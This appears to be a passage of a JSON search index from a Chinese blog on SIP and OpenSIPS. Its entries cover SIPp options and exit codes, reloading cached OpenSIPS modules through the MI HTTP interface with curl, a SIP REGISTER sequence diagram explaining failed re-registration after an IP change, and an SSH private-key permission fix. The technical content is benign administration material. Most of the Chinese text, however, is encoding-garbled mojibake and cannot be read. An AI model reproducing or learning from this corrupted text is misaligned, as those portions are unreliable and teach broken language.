name\u0026gt;_\u0026lt;pid\u0026gt;_rtt.csv. -trace_logs : Allow tracing of \u0026lt;log\u0026gt; actions in \u0026lt;scenario file name\u0026gt;_\u0026lt;pid\u0026gt;_logs.log. -users : Instead of starting calls at a fixed rate, begin \u0026#39;users\u0026#39; calls at startup, and keep the number of calls constant. -watchdog_interval: Set gap between watchdog timer firings. Default is 400. -watchdog_reset : If the watchdog timer has not fired in more than this time period, then reset the max triggers counters. Default is 10 minutes. -watchdog_minor_threshold: If it has been longer than this period between watchdog executions count a minor trip. Default is 500. -watchdog_major_threshold: If it has been longer than this period between watchdog executions count a major trip. Default is 3000. -watchdog_major_maxtriggers: How many times the major watchdog timer can be tripped before the test is terminated. Default is 10. -watchdog_minor_maxtriggers: How many times the minor watchdog timer can be tripped before the test is terminated. Default is 120. -tls_cert : Set the name for TLS Certificate file. Default is \u0026#39;cacert.pem -tls_key : Set the name for TLS Private Key file. Default is \u0026#39;cakey.pem\u0026#39; -tls_crl : Set the name for Certificate Revocation List file. If not specified, X509 CRL is not activated. -3pcc : Launch the tool in 3pcc mode (\u0026#34;Third Party call control\u0026#34;). The passed ip address is depending on the 3PCC role. - When the first twin command is \u0026#39;sendCmd\u0026#39; then this is the address of the remote twin socket. SIPp will try to connect to this address:port to send the twin command (This instance must be started after all other 3PCC scenarii). Example: 3PCC-C-A scenario. - When the first twin command is \u0026#39;recvCmd\u0026#39; then this is the address of the local twin socket. SIPp will open this address:port to listen for twin command. Example: 3PCC-C-B scenario. -tdmmap : Generate and handle a table of TDM circuits. A circuit must be available for the call to be placed. Format: -tdmmap {0-3}{99}{5-8}{1-31} -key : keyword value Set the generic parameter named \u0026#34;keyword\u0026#34; to \u0026#34;value\u0026#34;. -set : variable value Set the global variable parameter named \u0026#34;variable\u0026#34; to \u0026#34;value\u0026#34;. -multihome : Set multihome address for SCTP -heartbeat : Set heartbeat interval in ms for SCTP -assocmaxret : Set association max retransmit counter for SCTP -pathmaxret : Set path max retransmit counter for SCTP -pmtu : Set path MTU for SCTP -gracefulclose : If true, SCTP association will be closed with SHUTDOWN (default). If false, SCTP association will be closed by ABORT. -dynamicStart : variable value Set the start offset of dynamic_id varaiable -dynamicMax : variable value Set the maximum of dynamic_id variable -dynamicStep : variable value Set the increment of dynamic_id variable Signal handling: SIPp can be controlled using posix signals. The following signals are handled: USR1: Similar to press \u0026#39;q\u0026#39; keyboard key. It triggers a soft exit of SIPp. No more new calls are placed and all ongoing calls are finished before SIPp exits. Example: kill -SIGUSR1 732 USR2: Triggers a dump of all statistics screens in \u0026lt;scenario_name\u0026gt;_\u0026lt;pid\u0026gt;_screens.log file. Especially useful in background mode to know what the current status is. Example: kill -SIGUSR2 732 Exit code: Upon exit (on fatal error or when the number of asked calls (-m option) is reached, sipp exits with one of the following exit code: 0: All calls were successful 1: At least one call failed 97: exit on internal command. Calls may have been processed 99: Normal exit without calls processed -1: Fatal error -2: Fatal error binding a socket Example: Run sipp with embedded server (uas) scenario: ./sipp -sn uas On the same host, run sipp with embedded client (uac) scenario ./sipp -sn uac 127.0.0.1 å‚è€ƒ http://sipp.sourceforge.net/doc/reference.html http://sipp.sourceforge.net/doc3.3/reference.html å®æˆ˜è„šæœ¬å­¦ä¹  ä¸‹é¢çš„ä¸¤ä¸ªé“¾æ¥é‡Œé¢æœ‰å¾ˆå¤šçš„çœŸå®åœºæ™¯æµ‹è¯•çš„xmlæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ·±å…¥å­¦ä¹ \nhttps://github.com/pbertera/SIPp-by-example https://tomeko.net/other/sipp/sipp_cheatsheet.php?lang=pl ä¸­æ–‡æ•™ç¨‹ sippZhong Wen Jiao Cheng - Knight.pdfÂ é»„é¾™èˆŸç¿»è¯‘ ","permalink":"https://wdd.js.org/opensips/tools/sipp/","summary":"å®‰è£… SIPp 3.3 # è§£å‹ tar -zxvf sipp-3.3.990.tar.gz # centos å®‰è£…ä¾èµ– yum install lksctp-tools-devel libpcap-devel gcc-c++ gcc -y # ubuntu å®‰è£…ä»¥æ¥ apt-get install -y pkg-config dh-autoreconf ncurses-dev build-essential libssl-dev libpcap-dev libncurses5-dev libsctp-dev lksctp-tools ./configure --with-sctp --with-pcap make \u0026amp;\u0026amp; make install sipp -v SIPp v3.4-beta1 (aka v3.3.990)-SCTP-PCAP built Oct 6 2019, 20:12:17. This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.","title":"SIPpï¼šsipå‹æµ‹æ¨¡æ‹Ÿuaå·¥å…·"},{"content":"ç¼–è¯‘å™¨é¢æ— è¡¨æƒ…çš„è¯´ï¼šxxx.cfg 189è¡Œï¼Œæœ‰ä¸ªåœ°æ–¹å¤šäº†ä¸ªåˆ†å·ï¼Ÿ\nä½†æ˜¯ä½ åœ¨åœ¨xxx.cfgçš„åœ°189å“¼å“§å“¼å“§æ‰¾äº†åŠå¤©ï¼Œæ»¡å¤´å¤§æ±—ï¼Œä¹Ÿæ²¡å‘ç°æœ‰ä»»ä½•é—®é¢˜ï¼Œè¿™ä¸€è¡Œç”šè‡³è¿ä¸ªåˆ†å·éƒ½æ²¡æœ‰ï¼ï¼\nè€Œå®é™…ä¸Šï¼Œè¿™ä¸ªé—®é¢˜å¹¶ä¸æ˜¯å‡ºåœ¨ç¬¬189è¡Œï¼Œè€Œæ˜¯å‡ºåœ¨å‰é¢å‡ è¡Œã€‚\næ‰€ä»¥è¯´ï¼Œç¼–è¯‘å™¨å’Œå¥³æœ‹å‹çš„ç›¸åŒä¹‹å¤„åœ¨äºï¼š**ä»–ä»¬è¯´çš„è¯ï¼Œä½ ä¸èƒ½å…¨ä¿¡ï¼Œä¹Ÿä¸èƒ½ä¸ä¿¡ã€‚**è€Œè¦ä»ä»–ä»¬è¯´çš„è¯ä¸­åˆ†æä¸Šä¸‹æ–‡ï¼Œä»è››ä¸é©¬è¿¹ä¸­ï¼Œå¯»æ±‚å”¯ä¸€çš„çœŸç›¸ã€‚\n","permalink":"https://wdd.js.org/posts/2019/09/myy94p/","summary":"ç¼–è¯‘å™¨é¢æ— è¡¨æƒ…çš„è¯´ï¼šxxx.cfg 189è¡Œï¼Œæœ‰ä¸ªåœ°æ–¹å¤šäº†ä¸ªåˆ†å·ï¼Ÿ\nä½†æ˜¯ä½ åœ¨åœ¨xxx.cfgçš„åœ°189å“¼å“§å“¼å“§æ‰¾äº†åŠå¤©ï¼Œæ»¡å¤´å¤§æ±—ï¼Œä¹Ÿæ²¡å‘ç°æœ‰ä»»ä½•é—®é¢˜ï¼Œè¿™ä¸€è¡Œç”šè‡³è¿ä¸ªåˆ†å·éƒ½æ²¡æœ‰ï¼ï¼\nè€Œå®é™…ä¸Šï¼Œè¿™ä¸ªé—®é¢˜å¹¶ä¸æ˜¯å‡ºåœ¨ç¬¬189è¡Œï¼Œè€Œæ˜¯å‡ºåœ¨å‰é¢å‡ è¡Œã€‚\næ‰€ä»¥è¯´ï¼Œç¼–è¯‘å™¨å’Œå¥³æœ‹å‹çš„ç›¸åŒä¹‹å¤„åœ¨äºï¼š**ä»–ä»¬è¯´çš„è¯ï¼Œä½ ä¸èƒ½å…¨ä¿¡ï¼Œä¹Ÿä¸èƒ½ä¸ä¿¡ã€‚**è€Œè¦ä»ä»–ä»¬è¯´çš„è¯ä¸­åˆ†æä¸Šä¸‹æ–‡ï¼Œä»è››ä¸é©¬è¿¹ä¸­ï¼Œå¯»æ±‚å”¯ä¸€çš„çœŸç›¸ã€‚","title":"ç¼–è¯‘å™¨å’Œå¥³æœ‹å‹æœ‰ä»€ä¹ˆç›¸åŒä¹‹å¤„"},{"content":" å‚è€ƒ https://blog.opensips.org/2017/03/22/capturing-beyond-sip/ http://www.sipcapture.org/ https://github.com/sipcapture/homer/wiki ","permalink":"https://wdd.js.org/opensips/ch5/homer6/","summary":" å‚è€ƒ https://blog.opensips.org/2017/03/22/capturing-beyond-sip/ http://www.sipcapture.org/ https://github.com/sipcapture/homer/wiki ","title":"opensips é›†æˆ homer6"},{"content":"å¸¸è§çš„é—®é¢˜ æœ‰æ—¶å€™å¦‚æœä½ ç›´æ¥åœ¨æ•°æ®åº“ä¸­æ”¹åŠ¨æŸäº›å€¼ï¼Œä½†æ˜¯opensipså¹¶æ²¡æœ‰æŒ‰ç…§é¢„è®¾çš„å€¼å»æ‰§è¡Œï¼Œé‚£ä¹ˆä½ å°±è¦å°è¯•ä½¿ç”¨miå‘½ä»¤å»reloadç›¸å…³æ¨¡å—ã€‚\næœ‰ç¼“å­˜æ¨¡å— opensipsåœ¨å¯åŠ¨æ—¶ï¼Œä¼šå°†æŸäº›æ¨¡å—æ‰€ä½¿ç”¨çš„è¡¨ä¸€æ¬¡æ€§å…¨éƒ¨åŠ è½½åˆ°æ•°æ®åº“ï¼ŒçŠ¶æ€å˜åŒ–æ—¶ï¼Œå†å›å†™åˆ°æ•°æ®åº“ã€‚æœ‰ä¸€ä¸‹æ¨¡å—åˆ—è¡¨ï¼š\ndispather load_balancer carrierroute dialplan \u0026hellip; åˆ¤æ–­ä¸€ä¸ªæ¨¡å—æ˜¯å¦æ˜¯ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜çš„ï¼Œæœ‰ä¸ªç®€ä¾¿æ–¹æ³•ï¼Œçœ‹è¿™ä¸ªæ¨¡å—æ˜¯å¦æä¾›ç±»ä¼¼äº xx_reloadçš„miæ¥å£ï¼Œæœ‰reloadçš„miæ¥å£ï¼Œå°±è¯´æ˜è¿™ä¸ªæ¨¡å—æ˜¯ä½¿ç”¨ä¸€æ¬¡æ€§è¯»å–ï¼Œå˜åŒ–å›å†™çš„æ–¹å¼è¯»å†™æ•°æ®åº“ã€‚\nå°†æ¨¡å—ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜çš„å¥½å¤„æ—¶ä¸ç”¨æ¯æ¬¡éƒ½æŸ¥æ•°æ®åº“ï¼Œè¿è¡Œé€Ÿåº¦ä¼šå¤§å¤§æå‡ã€‚\nä»¥dispatherä¸ºä¾‹å­ï¼Œopensipsåœ¨å¯åŠ¨æ—¶ä¼šä»æ•°æ®åº“æ€»åŠ è½½ä¸€ç³»åˆ—çš„ç›®æ ‡åˆ°å†…å­˜ä¸­ï¼Œç„¶åæŒ‰ç…§è®¾å®šå€¼ï¼Œå‘¨æœŸæ€§çš„å‘ç›®æ ‡å‘é€optionsåŒ…ï¼Œå¦‚æœç›®æ ‡æŒ‚æ‰ï¼Œä¸‰æ¬¡æœªå“åº”ï¼Œopensipså°†ä¼šå°†è¯¥ç›®æ ‡çš„çŠ¶æ€è®¾ç½®ä¸ºé0å€¼ï¼Œè¡¨ç¤ºè¯¥åœ°å€ä¸å¯ç”¨ï¼ŒåŒæ—¶å°†è¯¥çŠ¶æ€å›å†™åˆ°æ•°æ®åº“ã€‚\næ— ç¼“å­˜æ¨¡å— æ— ç¼“å­˜çš„æ¨¡å—æ¯æ¬¡éƒ½ä¼šå‘æ•°æ®åº“æŸ¥è¯¢æ•°æ®ã€‚å¸¸è§çš„æ¨¡å—æœ‰alias_dbï¼Œè¯¥æ¨¡å—çš„è¯´æ˜\nALIAS_DB module can be used as an alternative for user aliases via usrloc. The main feature is that it does not store all adjacent data as for user location and always uses database for search (no memory caching).\nALIAS_DBä¸€èˆ¬ç”¨äºå‘¼å…¥æ—¶æ¥å…¥å·çš„æŸ¥è¯¢ï¼Œåœ¨å¤šç§Ÿæˆ·çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå¤§å¤šæ•°ç§Ÿæˆ·éƒ½æ˜¯ä½¿ç”¨å‘¼å…¥çš„åœºæ™¯ï¼Œé‚£ä¹ˆALIAS_DBæ¨¡å—å¯èƒ½ä¼šæ˜¯ä¸€ä¸ªæ€§èƒ½ç“¶é¢ˆï¼Œå»ºè®®å°†è¯¥æ¨¡å—ä½¿ç”¨ä¸€äº›å†…å­˜æ•°æ®åº“æ›¿ä»£ã€‚\nä»æµè§ˆå™¨reloadæ¨¡å— opensipsåœ¨åŠ è½½äº†httpdå’Œmi_httpæ¨¡å—ä¹‹åï¼Œå¯ä»¥åœ¨opensipsä¸»æœºçš„8888ç«¯å£è®¿é—®åˆ°ç®¡ç†é¡µé¢ï¼Œå…·ä½“åœ°å€å¦‚ï¼šhttp://opensips_host:8888/mi\nè¿™ä¸ªé¡µé¢å¯ä»¥çœ‹åˆ°opensipsæ‰€åŠ è½½çš„æ¨¡å—ï¼Œç„¶åæˆ‘ä»¬ç‚¹å‡»carrierroute,Â å¯ä»¥çœ‹åˆ°è¯¥æ¨¡å—æ‰€æ”¯æŒçš„ç®¡ç†å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚ä¸‹å›¾å·¦ä¾§åˆ—è¡¨æ‰€ç¤ºï¼Œå…¶ä¸­cr_reload_routeså°±æ˜¯ä¸€ä¸ªç®¡ç†å‘½ä»¤ã€‚\nç„¶åæˆ‘ä»¬ç‚¹å‡»cr_reload_routesè¿æ¥ï¼Œè·³è½¬åˆ°ä¸‹å›¾æ‰€ç¤ºé¡µé¢ã€‚å‚æ•°å¯ä»¥ä¸ç”¨å¡«å†™ï¼Œç›´æ¥ç‚¹å‡»submitå°±å¯ä»¥ã€‚æ­£å¸¸æƒ…å†µä¸‹å›è¿”å›Â 200 : OKï¼Œå°±è¯´æ˜reloadæ¨¡å—æˆåŠŸã€‚\nä½¿ç”¨curlå‘½ä»¤reloadæ¨¡å— å¦‚æœå› ä¸ºæŸäº›åŸå› ï¼Œæ— æ³•è®¿é—®webç•Œé¢ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨curlç­‰httpå‘½ä»¤è¡Œå·¥å…·æ‰§è¡Œcurlå‘½ä»¤ï¼Œä¾‹å¦‚\ncurl http://192.168.40.98:8888/mi/carrierroute/cr_reload_routes?arg= ","permalink":"https://wdd.js.org/opensips/ch3/cache-reload/","summary":"å¸¸è§çš„é—®é¢˜ æœ‰æ—¶å€™å¦‚æœä½ ç›´æ¥åœ¨æ•°æ®åº“ä¸­æ”¹åŠ¨æŸäº›å€¼ï¼Œä½†æ˜¯opensipså¹¶æ²¡æœ‰æŒ‰ç…§é¢„è®¾çš„å€¼å»æ‰§è¡Œï¼Œé‚£ä¹ˆä½ å°±è¦å°è¯•ä½¿ç”¨miå‘½ä»¤å»reloadç›¸å…³æ¨¡å—ã€‚\næœ‰ç¼“å­˜æ¨¡å— opensipsåœ¨å¯åŠ¨æ—¶ï¼Œä¼šå°†æŸäº›æ¨¡å—æ‰€ä½¿ç”¨çš„è¡¨ä¸€æ¬¡æ€§å…¨éƒ¨åŠ è½½åˆ°æ•°æ®åº“ï¼ŒçŠ¶æ€å˜åŒ–æ—¶ï¼Œå†å›å†™åˆ°æ•°æ®åº“ã€‚æœ‰ä¸€ä¸‹æ¨¡å—åˆ—è¡¨ï¼š\ndispather load_balancer carrierroute dialplan \u0026hellip; åˆ¤æ–­ä¸€ä¸ªæ¨¡å—æ˜¯å¦æ˜¯ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜çš„ï¼Œæœ‰ä¸ªç®€ä¾¿æ–¹æ³•ï¼Œçœ‹è¿™ä¸ªæ¨¡å—æ˜¯å¦æä¾›ç±»ä¼¼äº xx_reloadçš„miæ¥å£ï¼Œæœ‰reloadçš„miæ¥å£ï¼Œå°±è¯´æ˜è¿™ä¸ªæ¨¡å—æ˜¯ä½¿ç”¨ä¸€æ¬¡æ€§è¯»å–ï¼Œå˜åŒ–å›å†™çš„æ–¹å¼è¯»å†™æ•°æ®åº“ã€‚\nå°†æ¨¡å—ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜çš„å¥½å¤„æ—¶ä¸ç”¨æ¯æ¬¡éƒ½æŸ¥æ•°æ®åº“ï¼Œè¿è¡Œé€Ÿåº¦ä¼šå¤§å¤§æå‡ã€‚\nä»¥dispatherä¸ºä¾‹å­ï¼Œopensipsåœ¨å¯åŠ¨æ—¶ä¼šä»æ•°æ®åº“æ€»åŠ è½½ä¸€ç³»åˆ—çš„ç›®æ ‡åˆ°å†…å­˜ä¸­ï¼Œç„¶åæŒ‰ç…§è®¾å®šå€¼ï¼Œå‘¨æœŸæ€§çš„å‘ç›®æ ‡å‘é€optionsåŒ…ï¼Œå¦‚æœç›®æ ‡æŒ‚æ‰ï¼Œä¸‰æ¬¡æœªå“åº”ï¼Œopensipså°†ä¼šå°†è¯¥ç›®æ ‡çš„çŠ¶æ€è®¾ç½®ä¸ºé0å€¼ï¼Œè¡¨ç¤ºè¯¥åœ°å€ä¸å¯ç”¨ï¼ŒåŒæ—¶å°†è¯¥çŠ¶æ€å›å†™åˆ°æ•°æ®åº“ã€‚\næ— ç¼“å­˜æ¨¡å— æ— ç¼“å­˜çš„æ¨¡å—æ¯æ¬¡éƒ½ä¼šå‘æ•°æ®åº“æŸ¥è¯¢æ•°æ®ã€‚å¸¸è§çš„æ¨¡å—æœ‰alias_dbï¼Œè¯¥æ¨¡å—çš„è¯´æ˜\nALIAS_DB module can be used as an alternative for user aliases via usrloc. The main feature is that it does not store all adjacent data as for user location and always uses database for search (no memory caching).\nALIAS_DBä¸€èˆ¬ç”¨äºå‘¼å…¥æ—¶æ¥å…¥å·çš„æŸ¥è¯¢ï¼Œåœ¨å¤šç§Ÿæˆ·çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå¤§å¤šæ•°ç§Ÿæˆ·éƒ½æ˜¯ä½¿ç”¨å‘¼å…¥çš„åœºæ™¯ï¼Œé‚£ä¹ˆALIAS_DBæ¨¡å—å¯èƒ½ä¼šæ˜¯ä¸€ä¸ªæ€§èƒ½ç“¶é¢ˆï¼Œå»ºè®®å°†è¯¥æ¨¡å—ä½¿ç”¨ä¸€äº›å†…å­˜æ•°æ®åº“æ›¿ä»£ã€‚\nä»æµè§ˆå™¨reloadæ¨¡å— opensipsåœ¨åŠ è½½äº†httpdå’Œmi_httpæ¨¡å—ä¹‹åï¼Œå¯ä»¥åœ¨opensipsä¸»æœºçš„8888ç«¯å£è®¿é—®åˆ°ç®¡ç†é¡µé¢ï¼Œå…·ä½“åœ°å€å¦‚ï¼šhttp://opensips_host:8888/mi\nè¿™ä¸ªé¡µé¢å¯ä»¥çœ‹åˆ°opensipsæ‰€åŠ è½½çš„æ¨¡å—ï¼Œç„¶åæˆ‘ä»¬ç‚¹å‡»carrierroute,Â å¯ä»¥çœ‹åˆ°è¯¥æ¨¡å—æ‰€æ”¯æŒçš„ç®¡ç†å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚ä¸‹å›¾å·¦ä¾§åˆ—è¡¨æ‰€ç¤ºï¼Œå…¶ä¸­cr_reload_routeså°±æ˜¯ä¸€ä¸ªç®¡ç†å‘½ä»¤ã€‚\nç„¶åæˆ‘ä»¬ç‚¹å‡»cr_reload_routesè¿æ¥ï¼Œè·³è½¬åˆ°ä¸‹å›¾æ‰€ç¤ºé¡µé¢ã€‚å‚æ•°å¯ä»¥ä¸ç”¨å¡«å†™ï¼Œç›´æ¥ç‚¹å‡»submitå°±å¯ä»¥ã€‚æ­£å¸¸æƒ…å†µä¸‹å›è¿”å›Â 200 : OKï¼Œå°±è¯´æ˜reloadæ¨¡å—æˆåŠŸã€‚\nä½¿ç”¨curlå‘½ä»¤reloadæ¨¡å— å¦‚æœå› ä¸ºæŸäº›åŸå› ï¼Œæ— æ³•è®¿é—®webç•Œé¢ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨curlç­‰httpå‘½ä»¤è¡Œå·¥å…·æ‰§è¡Œcurlå‘½ä»¤ï¼Œä¾‹å¦‚\ncurl http://192.168.40.98:8888/mi/carrierroute/cr_reload_routes?arg= ","title":"æ¨¡å—ç¼“å­˜ç­–ç•¥ä¸reloadæ–¹æ³•"},{"content":" sequenceDiagram autonumber participant a as 192.168.0.123:55647 participant b as 1.2.3.4:5060 participant c as 172.10.10.3:49543 a-\u003e\u003eb: register cseq=1, callId=1 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=2, callid=1 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=3, callId=1 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=4, callid=1 b--\u003e\u003ea: 200 c-\u003e\u003eb: register cseq=5, callid=1 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=6, callid=1 b--\u003e\u003ec: 500 Service Unavailable c-\u003e\u003eb: register cseq=7, callid=2 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=8, callid=2 b--\u003e\u003ec: 200 c-\u003e\u003eb: register cseq=9, callid=2 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=10, callid=2 b--\u003e\u003ec: 200 c-\u003e\u003eb: register cseq=11, callid=2 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=12, callid=2 b--\u003e\u003ec: 500 Service Unavailable a-\u003e\u003eb: register cseq=13, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=14, callid=3 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=15, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=16, callid=3 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=17, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=18, callid=3 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=19, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=20, callid=3 b--\u003e\u003ea: 200 æœåŠ¡ç«¯è®¾ç½®çš„è¿‡æœŸæ—¶é—´æ˜¯120s å®¢æˆ·ç«¯æ¯éš”115sæ³¨å†Œä¸€æ¬¡, callidå’Œä¹‹å‰çš„ä¿æŒä¸å˜ å½“ç½‘ç»œå˜äº†ä¹‹åï¼Œç”±äºipåœ°å€æ”¹å˜ï¼Œå®¢æˆ·ç«¯çš„åœ¨115ç§’æ³¨å†Œï¼Œæ­¤æ—¶æœåŠ¡ç«¯è¿˜æœªè¶…æ—¶ï¼Œæ‰€ä»¥ç»™å®¢æˆ·ç«¯å“åº”æŠ¥é”™500 å®¢æˆ·ç«¯åœ¨ç­‰äº†8ç§’ä¹‹åï¼Œç­‰å¾…æœåŠ¡ç«¯è¶…æ—¶ï¼Œç„¶åå†æ¬¡æ³¨å†Œï¼Œå†æ¬¡æ³¨å†Œæ—¶ï¼Œcallidæ”¹å˜ å› ä¸ºæœåŠ¡ç«¯å·²ç»è¶…æ—¶ï¼Œæ‰€ä»¥èƒ½å¤Ÿæ³¨å†ŒæˆåŠŸ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªæ³¨å†Œå‘¨æœŸå†…ï¼Œå®¢æˆ·ç«¯çš„æ³¨å†Œä¿¡æ¯åŒ…æ‹¬IPã€ç«¯å£ã€åè®®ã€CallIDéƒ½ä¸èƒ½å˜ï¼Œä¸€æ—¦æ”¹å˜äº†ã€‚å¦‚æœæœåŠ¡ç«¯çš„è®°å½•è¿˜æ²¡æœ‰å¤±æ•ˆï¼Œæ–°çš„æ³¨å†Œå°±ä¼šå¤±è´¥ã€‚\næœ‰çš„å®¢æˆ·ä¼šç»å¸¸åé¦ˆï¼Œä»–ä»¬çš„åˆ†æœºæ€»æ˜¯æ— è¾œæ‰çº¿ã€‚ç»è¿‡æŠ“åŒ…åˆ†æï¼Œå‘ç°åˆ†æœºæ¯éš”1.5åˆ†é’Ÿæ³¨å†Œä¸€æ¬¡ï¼Œä½¿ç”¨tcpæ³¨å†Œçš„ï¼Œæ¯æ¬¡çš„ç«¯å£å·éƒ½ä¼šå˜æˆä¸åŒçš„å€¼ã€‚\nç„¶åå°è¯•è®©åˆ†æœºç”¨udpæ³¨å†Œï¼Œåˆ†æœºå°±ä¸å†å¼‚å¸¸æ‰çº¿äº†ã€‚\nä¸€ä¸ªtcp socketä¸€æ—¦å…³é—­ï¼Œæ–°çš„tcp socketå¿…ç„¶ä¼šè¢«åˆ†é…ä¸åŒçš„ç«¯å£ã€‚ä½†æ˜¯udpä¸ä¸€æ ·ï¼Œudpæ˜¯æ— è¿æ¥çš„ã€‚\n","permalink":"https://wdd.js.org/opensips/ch1/sip-register/","summary":"sequenceDiagram autonumber participant a as 192.168.0.123:55647 participant b as 1.2.3.4:5060 participant c as 172.10.10.3:49543 a-\u003e\u003eb: register cseq=1, callId=1 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=2, callid=1 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=3, callId=1 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=4, callid=1 b--\u003e\u003ea: 200 c-\u003e\u003eb: register cseq=5, callid=1 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=6, callid=1 b--\u003e\u003ec: 500 Service Unavailable c-\u003e\u003eb: register cseq=7, callid=2 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=8, callid=2 b--\u003e\u003ec: 200 c-\u003e\u003eb: register cseq=9, callid=2 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=10, callid=2 b--\u003e\u003ec: 200 c-\u003e\u003eb: register cseq=11, callid=2 b--\u003e\u003ec: 401 Unauthorized c-\u003e\u003eb: register cseq=12, callid=2 b--\u003e\u003ec: 500 Service Unavailable a-\u003e\u003eb: register cseq=13, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=14, callid=3 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=15, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=16, callid=3 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=17, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=18, callid=3 b--\u003e\u003ea: 200 a-\u003e\u003eb: register cseq=19, callId=3 b--\u003e\u003ea: 401 Unauthorized a-\u003e\u003eb: register cseq=20, callid=3 b--\u003e\u003ea: 200 æœåŠ¡ç«¯è®¾ç½®çš„è¿‡æœŸæ—¶é—´æ˜¯120s å®¢æˆ·ç«¯æ¯éš”115sæ³¨å†Œä¸€æ¬¡, callidå’Œä¹‹å‰çš„ä¿æŒä¸å˜ å½“ç½‘ç»œå˜äº†ä¹‹åï¼Œç”±äºipåœ°å€æ”¹å˜ï¼Œå®¢æˆ·ç«¯çš„åœ¨115ç§’æ³¨å†Œï¼Œæ­¤æ—¶æœåŠ¡ç«¯è¿˜æœªè¶…æ—¶ï¼Œæ‰€ä»¥ç»™å®¢æˆ·ç«¯å“åº”æŠ¥é”™500 å®¢æˆ·ç«¯åœ¨ç­‰äº†8ç§’ä¹‹åï¼Œç­‰å¾…æœåŠ¡ç«¯è¶…æ—¶ï¼Œç„¶åå†æ¬¡æ³¨å†Œï¼Œå†æ¬¡æ³¨å†Œæ—¶ï¼Œcallidæ”¹å˜ å› ä¸ºæœåŠ¡ç«¯å·²ç»è¶…æ—¶ï¼Œæ‰€ä»¥èƒ½å¤Ÿæ³¨å†ŒæˆåŠŸ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªæ³¨å†Œå‘¨æœŸå†…ï¼Œå®¢æˆ·ç«¯çš„æ³¨å†Œä¿¡æ¯åŒ…æ‹¬IPã€ç«¯å£ã€åè®®ã€CallIDéƒ½ä¸èƒ½å˜ï¼Œä¸€æ—¦æ”¹å˜äº†ã€‚å¦‚æœæœåŠ¡ç«¯çš„è®°å½•è¿˜æ²¡æœ‰å¤±æ•ˆï¼Œæ–°çš„æ³¨å†Œå°±ä¼šå¤±è´¥ã€‚","title":"SIPæ³¨å†Œè°ƒç ”"},{"content":"æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for \u0026#39;mmmmm\u0026#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. è§£å†³æ–¹æ¡ˆï¼šå°†ä½ çš„ç§é’¥çš„æƒé™æ”¹ä¸º600, ä¹Ÿå°±æ˜¯è¯´åªæœ‰ä½ è‡ªå·±å¯è¯»å¯å†™ï¼Œå…¶ä»–äººéƒ½ä¸èƒ½ç”¨\nchmod 600 ä½ çš„ç§é’¥ ","permalink":"https://wdd.js.org/posts/2019/08/vhovcg/","summary":"æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for \u0026#39;mmmmm\u0026#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. è§£å†³æ–¹æ¡ˆï¼šå°†ä½ çš„ç§é’¥çš„æƒé™æ”¹ä¸º600, ä¹Ÿå°±æ˜¯è¯´åªæœ‰ä½ è‡ªå·±å¯è¯»å¯å†™ï¼Œå…¶ä»–äººéƒ½ä¸èƒ½ç”¨\nchmod 600 ä½ çš„ç§é’¥ ","title":"ssh ç§é’¥ä½¿ç”¨å¤±è´¥"},{"content":"ä¸¤ç§å¤´ via headersÂ 